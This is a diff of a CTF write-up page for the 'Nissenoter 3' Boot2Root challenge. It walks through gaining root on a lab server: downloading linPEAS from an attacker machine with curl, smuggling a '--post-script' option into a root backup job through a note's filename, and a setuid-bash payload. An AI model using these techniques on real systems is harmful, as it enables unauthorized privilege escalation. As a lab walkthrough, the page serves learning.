@@ -1,269 +1,97 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-<meta charset="UTF-8">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="robots" content="index, follow">
-<meta name="revisit-after" content="15 days">
-<link rel="author" href="/humans.txt">
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<meta name="msapplication-TileImage" content="/mstile-144x144.png">
-<link rel="shortcut icon" href="/favicon.ico"><meta name="author" content="Adamino">
-
-
-  <meta itemprop="name" content="Nissenoter 3">
-  <meta itemprop="description" content="Challenge Name: Nissenoter 3
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="index, follow"><meta name=revisit-after content="15 days"><link rel=author href=/humans.txt><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileImage content="/mstile-144x144.png"><link rel="shortcut icon" href=/favicon.ico><meta name=author content="Adamino"><meta itemprop=name content="Nissenoter 3"><meta itemprop=description content="Challenge Name: Nissenoter 3
 Category: Boot2Root
 Challenge Description: Vi er sikre på, nisserne deler statshemmeligheder, hvorfor skulle netværket ellers være lukket og være beskyttet af teknologi i verdensklasse? - Vores praktikant siger i hvert fald, at det er verdensklasse.
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
 Approach The final enumeration Continuing from Nissenoter 2 we now have foothold on the server as a user!
-Let’s immediately execute some initial enumeration and see what we can find">
-  <meta itemprop="datePublished" content="2023-12-15T15:33:38+01:00">
-  <meta itemprop="dateModified" content="2023-12-15T15:33:38+01:00">
-  <meta itemprop="wordCount" content="1252">
-  <meta itemprop="keywords" content="Boot2Root"><meta property="og:url" content="http://localhost:1313/nc3/boot2root/nissenoter-3/">
-  <meta property="og:site_name" content="Adamino CTF Writeups">
-  <meta property="og:title" content="Nissenoter 3">
-  <meta property="og:description" content="Challenge Name: Nissenoter 3
+Let’s immediately execute some initial enumeration and see what we can find"><meta itemprop=datePublished content="2023-12-15T15:33:38+01:00"><meta itemprop=dateModified content="2023-12-15T15:33:38+01:00"><meta itemprop=wordCount content="1252"><meta itemprop=keywords content="Boot2Root"><meta property="og:url" content="https://ctf.adamino.dk/nc3/boot2root/nissenoter-3/"><meta property="og:site_name" content="Adamino CTF Writeups"><meta property="og:title" content="Nissenoter 3"><meta property="og:description" content="Challenge Name: Nissenoter 3
 Category: Boot2Root
 Challenge Description: Vi er sikre på, nisserne deler statshemmeligheder, hvorfor skulle netværket ellers være lukket og være beskyttet af teknologi i verdensklasse? - Vores praktikant siger i hvert fald, at det er verdensklasse.
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
 Approach The final enumeration Continuing from Nissenoter 2 we now have foothold on the server as a user!
-Let’s immediately execute some initial enumeration and see what we can find">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="nc3">
-    <meta property="article:published_time" content="2023-12-15T15:33:38+01:00">
-    <meta property="article:modified_time" content="2023-12-15T15:33:38+01:00">
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Nissenoter 3">
-  <meta name="twitter:description" content="Challenge Name: Nissenoter 3
+Let’s immediately execute some initial enumeration and see what we can find"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="nc3"><meta property="article:published_time" content="2023-12-15T15:33:38+01:00"><meta property="article:modified_time" content="2023-12-15T15:33:38+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Nissenoter 3"><meta name=twitter:description content="Challenge Name: Nissenoter 3
 Category: Boot2Root
 Challenge Description: Vi er sikre på, nisserne deler statshemmeligheder, hvorfor skulle netværket ellers være lukket og være beskyttet af teknologi i verdensklasse? - Vores praktikant siger i hvert fald, at det er verdensklasse.
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
 Approach The final enumeration Continuing from Nissenoter 2 we now have foothold on the server as a user!
-Let’s immediately execute some initial enumeration and see what we can find">
-<title>Nissenoter 3</title>
-<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="http://localhost:1313/css/style.min.2d1df3d10e8fa64ec05ab1169da39cc7ce323ff1a80fb94a0b820888e0defd02.css" integrity="sha256-LR3z0Q6Ppk7AWrEWnaOcx84yP/GoD7lKC4IIiODe/QI=" crossorigin="anonymous">
-	</head>
-<body id="page">
-	<header id="site-header" class="animated slideInUp">
-		<div class="hdr-wrapper section-inner">
-			<div class="hdr-left">
-				<div class="site-branding">
-					<a href="http://localhost:1313/">Adamino CTF Writeups</a>
-				</div>
-				<nav class="site-nav hide-in-mobile">
-				<a href="http://localhost:1313/tools/">Tools</a>
-				<a href="http://localhost:1313/nc3/">NC3</a>
-</nav>
-			</div>
-			<div class="hdr-right hdr-icons">
-				<span class="hdr-social hide-in-mobile"><a href="https://github.com/onero" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24"
-  fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-  <path
-    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-  </path>
-</svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-  class="feather feather-menu">
-  <line x1="3" y1="12" x2="21" y2="12"></line>
-  <line x1="3" y1="6" x2="21" y2="6"></line>
-  <line x1="3" y1="18" x2="21" y2="18"></line>
-</svg></button>
-			</div>
-		</div>
-	</header>
-	<div id="mobile-menu" class="animated fast">
-		<ul>
-			<li><a href="http://localhost:1313/tools/">Tools</a></li>
-			<li><a href="http://localhost:1313/nc3/">NC3</a></li>
-		</ul>
-	</div>
-
-
-	<main class="site-main section-inner thin animated fadeIn faster">
-		<h1>Nissenoter 3</h1>
-		<div class="content">
-			<h2 id="challenge-name">Challenge Name:<a href="#challenge-name" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Nissenoter 3</p>
-<h2 id="category">Category:<a href="#category" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Boot2Root</p>
-<h2 id="challenge-description">Challenge Description:<a href="#challenge-description" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Vi er sikre på, nisserne deler statshemmeligheder, hvorfor skulle netværket ellers være lukket og være beskyttet af teknologi i verdensklasse? - Vores praktikant siger i hvert fald, at det er verdensklasse.</p>
-<p><em>Opgaven er tilgængelig via Haaukins:</em></p>
-<p><a href="https://ncctf.haaukins.dk/">https://ncctf.haaukins.dk/</a></p>
-<h2 id="approach">Approach<a href="#approach" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<h3 id="the-final-enumeration">The final enumeration<a href="#the-final-enumeration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>Continuing from <a href="/nc3/boot2root/nissenoter-2/">Nissenoter 2</a> we now have foothold on the server as a user!</p>
-<p>Let&rsquo;s immediately execute some initial enumeration and see what we can find</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rrensdyr@edc9b2907c7e:~$ whoami <span style="color:#f92672">&amp;&amp;</span> uname -a <span style="color:#f92672">&amp;&amp;</span> sudo -l
-</span></span><span style="display:flex;"><span>rrensdyr
-</span></span><span style="display:flex;"><span>Linux edc9b2907c7e 5.15.0-88-generic <span style="color:#75715e">#98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 GNU/Linux</span>
-</span></span><span style="display:flex;"><span>-bash: sudo: command not found
-</span></span></code></pre></div><p>We are connected as the rrendsyr user on a Linux system, but cannot execute anything as super user. We already know from the previous challenge, that the only file in our home directly is the flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rrensdyr@edc9b2907c7e:~$ find / -type f -perm -04000 -ls 2&gt;/dev/null
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943279</span>     <span style="color:#ae81ff">60</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">59704</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/mount
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943371</span>     <span style="color:#ae81ff">36</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">35128</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/umount
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943284</span>     <span style="color:#ae81ff">48</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">48896</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/newgrp
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943295</span>     <span style="color:#ae81ff">68</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">68248</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/passwd
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943160</span>     <span style="color:#ae81ff">52</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">52880</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/chsh
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943347</span>     <span style="color:#ae81ff">72</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">72000</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/su
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943154</span>     <span style="color:#ae81ff">64</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">62672</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/chfn
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">5943221</span>     <span style="color:#ae81ff">88</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">88496</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /usr/bin/gpasswd
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">6704110</span>    <span style="color:#ae81ff">640</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root       <span style="color:#ae81ff">653888</span> Sep <span style="color:#ae81ff">23</span> 22:11 /usr/lib/openssh/ssh-keysign
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">6704087</span>     <span style="color:#ae81ff">52</span> -rwsr-xr--   <span style="color:#ae81ff">1</span> root     messagebus    <span style="color:#ae81ff">51272</span> Sep <span style="color:#ae81ff">16</span> 10:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-</span></span><span style="display:flex;"><span>  rrensdyr@edc9b2907c7e:~$
-</span></span></code></pre></div><p>The intention of this command is to look for <a href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit">SUID bits</a>, which can be used in certain situations to escalate privileges (PrivEsc). One great site for finding such tricks is <a href="https://gtfobins.github.io/">GTFOBINS</a>.
-Unfortunately this is also not a possible path forward, seeing as only the root user has these bits set.</p>
-<p>We therefore upload an enumeration script from our attacking machine to the victim by opening a webserver from our Kali machine</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ python3 -m http.server <span style="color:#ae81ff">1337</span>
-</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">1337</span> <span style="color:#f92672">(</span>http://0.0.0.0:1337/<span style="color:#f92672">)</span> ...
-</span></span></code></pre></div><p>and on the victim we make a wget request to download linPeas</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rrensdyr@edc9b2907c7e:~$ curl -O http://77.229.233.4:1337/linpeas.sh
-</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>  815k  <span style="color:#ae81ff">100</span>  815k    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  51.5M      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- 53.1M
-</span></span><span style="display:flex;"><span>rrensdyr@edc9b2907c7e:~$ ls
-</span></span><span style="display:flex;"><span>flag.txt  linpeas.sh
-</span></span><span style="display:flex;"><span>rrensdyr@edc9b2907c7e:~$ chmod +x linpeas.sh
-</span></span></code></pre></div><p>After downloading the <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">enumeration script</a> and making it executable, we run it and read through the report, in which we see that there is an interesting &ldquo;/var/backups/backup.sh&rdquo; script owned by root</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Backup files <span style="color:#f92672">(</span>limited 100<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">632</span> Dec  <span style="color:#ae81ff">8</span> 08:27 /var/backups/backup.sh
-</span></span></code></pre></div><p>Let&rsquo;s take a look at this script</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>user_notes<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/html/user_notes/&#34;</span>
-</span></span><span style="display:flex;"><span>backup_dir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/backups/user_notes/&#34;</span>
-</span></span><span style="display:flex;"><span>backup_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$backup_dir<span style="color:#66d9ef">$(</span>date +%Y%m%d-%H%M%S<span style="color:#66d9ef">)</span><span style="color:#e6db74">.tar.gz&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> backup <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>  pushd <span style="color:#e6db74">&#34;</span>$user_notes<span style="color:#e6db74">&#34;</span> &gt; /dev/null <span style="color:#f92672">||</span> exit
-</span></span><span style="display:flex;"><span>  tmp_dir<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
-</span></span><span style="display:flex;"><span>  /usr/local/bin/backup -o <span style="color:#e6db74">&#34;</span>$tmp_dir<span style="color:#e6db74">&#34;</span> *
-</span></span><span style="display:flex;"><span>  pushd <span style="color:#e6db74">&#34;</span>$tmp_dir<span style="color:#e6db74">&#34;</span> &gt; /dev/null <span style="color:#f92672">||</span> exit
-</span></span><span style="display:flex;"><span>  tar -czf <span style="color:#e6db74">&#34;</span>$backup_file<span style="color:#e6db74">&#34;</span> .
-</span></span><span style="display:flex;"><span>  popd &gt; /dev/null <span style="color:#f92672">||</span> exit
-</span></span><span style="display:flex;"><span>  rm -rf <span style="color:#e6db74">&#34;</span>$tmp_dir<span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> remove_old_backups <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>  dir_files<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>find $backup_dir -type f -name <span style="color:#e6db74">&#34;*.tar.gz&#34;</span> | wc -l<span style="color:#66d9ef">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$dir_files<span style="color:#e6db74">&#34;</span> -gt <span style="color:#ae81ff">7</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
-</span></span><span style="display:flex;"><span>    find $backup_dir -type f -name <span style="color:#e6db74">&#34;*.tar.gz&#34;</span> | sort | head -n -7 | xargs rm -f
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">fi</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>backup
-</span></span><span style="display:flex;"><span>remove_old_backups
-</span></span></code></pre></div><p>Upon examining the backup.sh script, we confirm that it indeed takes backups. Two functions are defined: backup and remove_old_backups. Starting with remove_old_backups, we see that it checks if there are more than 7 files ending with .tar.gz in the &ldquo;/var/backups/user_notes/&rdquo; directory and deletes the oldest files to leave only 7 remaining.</p>
-<p>The backup function changes the current directory to &ldquo;/var/www/html/user_notes/&rdquo;, then creates a temporary folder. Once this is done, a binary file, &ldquo;/usr/local/bin/backup&rdquo;, is called with some parameters. After the binary is called, the script moves the folder to temp_dir, where it packs all the files in the folder into a .tar.gz file and saves this file in &ldquo;/var/backups/user_notes/&rdquo;.</p>
-<p>It&rsquo;s time to take a closer look at &ldquo;/usr/local/bin/backup&rdquo;. Firstly, to find out what -o does, even though we can guess based on the script, but also to see if there are other parameters that can be set. The reason this is interesting is the way the file is called. Namely, with _, which is a Bash Wildcard, as the last parameter. In bash, _ expands to all files in the current directory, so in principle, backup is called as follows.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/local/bin/backup -o <span style="color:#e6db74">&#34;/tmp/tmp.3yNOBzjK59&#34;</span> file1 file2 file3 etc
-</span></span></code></pre></div><p>This means that if there are any interesting parameters that can be set in connection with backup, we have the opportunity to set them if we can control the filenames that appear in &ldquo;/var/www/html/user_notes/&rdquo;. Therefore, let&rsquo;s immediately check what backup can do.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rrensdyr@bdf69f47608c:~$ /usr/local/bin/backup
-</span></span><span style="display:flex;"><span>Missing output folder
-</span></span><span style="display:flex;"><span>Allowed options:
-</span></span><span style="display:flex;"><span>--help produce help message
-</span></span><span style="display:flex;"><span>-i <span style="color:#f92672">[</span> --input-files <span style="color:#f92672">]</span> arg Files to backup
-</span></span><span style="display:flex;"><span>-o <span style="color:#f92672">[</span> --output-folder <span style="color:#f92672">]</span> arg Folder to backup to
-</span></span><span style="display:flex;"><span>--pre-script arg Script to run before starting the backup
-</span></span><span style="display:flex;"><span>--post-script arg Script to run after finishing the backup
-</span></span></code></pre></div><p>Okay, it looks like it can run scripts both before and after a backup has been made, via &ndash;pre-script and &ndash;post-script, respectively. From here, one can either take an educated guess, guessing that, for example, .sh files are meant, or download and reverse engineer the backup binary.</p>
-<p>We take an educated guess. So let&rsquo;s write two files to &ldquo;/var/www/html/user_notes/&rdquo;, one named &ldquo;&ndash;post-script&rdquo;, and one named &ldquo;Adamino&rdquo;, containing our exploit. Unfortunately, rrensdyr cannot write to the folder, so we need to do it through the web interface.</p>
-<p>First, we create a note with the title Adamino and the following content:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>chmod +s /usr/bin/bash
-</span></span></code></pre></div><p>&ldquo;chmod +s&rdquo; is used for setuid and ensures that a binary will run with the privileges of the file owner. In this case, the owner is root, which happens to be the user we want to access.</p>
-<p>Then, a note is created with the title &ldquo;&ndash;post-script&rdquo; and arbitrary content. Once that file is created, our exploit code will be executed.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rrensdyr@bdf69f47608c:~$ ls -l /usr/bin/bash
-</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1265648</span> Apr <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">2023</span> /usr/bin/bash
-</span></span></code></pre></div><p>As we can see in the snippet above, setuid (SUID) and setguid (SGID) have been set on /usr/bin/bash, which is perfect. If we now call bash with the -p flag, for privileged mode, we get a root shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rrensdyr@bdf69f47608c:~$ bash -p
-</span></span><span style="display:flex;"><span>bash-5.2# whoami
-</span></span><span style="display:flex;"><span>root
-</span></span></code></pre></div><p>As shown in the snippet above, we have now succeeded, and the final flag can be retrieved!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.2# cat /root/flag.txt
-</span></span><span style="display:flex;"><span>NC3<span style="color:#f92672">{</span>1. Always backup; 2. Forget --; 3. ???? 4. Profit!<span style="color:#f92672">}</span>
-</span></span></code></pre></div><h2 id="flag">Flag<a href="#flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>NC3{1. Always backup; 2. Forget --; 3. ???? 4. Profit!}
-</span></span></code></pre></div><h2 id="reflections-and-learnings">Reflections and Learnings<a href="#reflections-and-learnings" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<h3 id="initial-enumeration-and-strategy">Initial Enumeration and Strategy:<a href="#initial-enumeration-and-strategy" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>Employing tools like linpeas.sh was a critical step. It allowed us to discover the /var/backups/backup.sh script, which became the focal point for further investigation. This reinforces the importance of using the right tools for efficient system analysis.</p>
-<h3 id="analyzing-the-backup-script">Analyzing the Backup Script:<a href="#analyzing-the-backup-script" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>The deep dive into the backup.sh script was a reminder that sometimes, the path to escalation lies not in exploiting a weakness but in leveraging the intended functionality of system scripts.</p>
-<h3 id="exploiting-the-backup-binary">Exploiting the Backup Binary:<a href="#exploiting-the-backup-binary" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>The discovery of the &ndash;pre-script and &ndash;post-script options in /usr/local/bin/backup was pivotal. It’s a lesson in thorough examination and thinking creatively about how to use the system&rsquo;s features to our advantage.</p>
-<h3 id="the-journey-at-an-end">The journey at an end<a href="#the-journey-at-an-end" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>All in all Nissenoter was great fun and a wonderful learning path for Web exploitation! In its essence it was a tremendous showcase of a &ldquo;typical HackTheBox&rdquo; challenge, in which we through careful enumeration can identify exploits to execute in order to gain foothold and in the end escalate our privileges to become system administrator and retrieve the final flag!</p>
-
-		</div>
-	</main>
-
-<footer id="site-footer" class="section-inner thin animated fadeIn faster">
-  <p>
-    &copy; 2025 <a href="http://localhost:1313/">Adamino</a>
-    &#183; The quieter you become the more you are able to hear
-    
-    &#183;
-    
-  </p>
-
-</footer>
-
